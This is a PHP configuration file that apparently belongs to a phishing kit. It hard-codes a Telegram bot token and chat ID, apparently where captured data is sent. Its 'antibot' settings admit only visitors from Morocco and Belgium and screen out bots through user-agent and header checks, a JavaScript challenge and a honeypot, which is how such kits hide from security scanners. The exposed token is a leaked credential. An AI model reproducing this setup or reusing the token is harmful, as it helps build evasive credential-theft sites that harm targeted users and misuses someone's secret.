<?php
// Telegram configuration (original)
$bot_token = '1303586783:AAFPVc3CQFHTvQSewbZL1mn3477f_Jz-v24';
$chat_id   = '-5241027864';

// ============================================================
// ANTIBOT CONFIGURATION
// ============================================================

// Enable/Disable antibot protection
$antibot_config = [
    'enabled' => true,
    
    // Country filtering
    'country_filter' => [
        'enabled' => true,
        'mode' => 'whitelist', // 'whitelist' or 'blacklist'
        'allowed_countries' => ['MA', 'BE'], // ISO 2-letter codes
        'blocked_countries' => ['CN', 'RU', 'KP', 'IR'], // Only used if mode is 'blacklist'
        'block_unknown' => false, // Block if country cannot be determined
    ],
    
    // Rate limiting
    'rate_limit' => [
        'enabled' => true,
        'max_requests_per_minute' => 20,
        'max_requests_per_hour' => 100,
        'max_requests_per_day' => 500,
        'block_duration' => 3600, // seconds (1 hour)
    ],
    
    // Bot detection
    'bot_detection' => [
        'enabled' => true,
        'check_user_agent' => true,
        'check_headers' => true,
        'check_behavior' => true,
        'javascript_challenge' => true,
        'challenge_timeout' => 30, // seconds
    ],
    
    // Security settings
    'security' => [
        'block_proxies' => false, // Be careful - might block legitimate users
        'block_vpns' => false,    // Be careful - might block legitimate users
        'check_referrer' => false,
        'honeypot_enabled' => true,
    ],
    
    // Logging and monitoring
    'logging' => [
        'enabled' => true,
        'log_blocked' => true,
        'log_suspicious' => true,
        'log_file' => './antibot/logs/antibot.log',
        'max_log_size' => 10485760, // 10MB
    ],
    
    // Performance settings
    'performance' => [
        'cache_duration' => 300, // Cache results for 5 minutes
        'async_checks' => true,   // Perform some checks asynchronously
        'fail_open' => true,      // Allow access if antibot system fails
    ],
];
?>
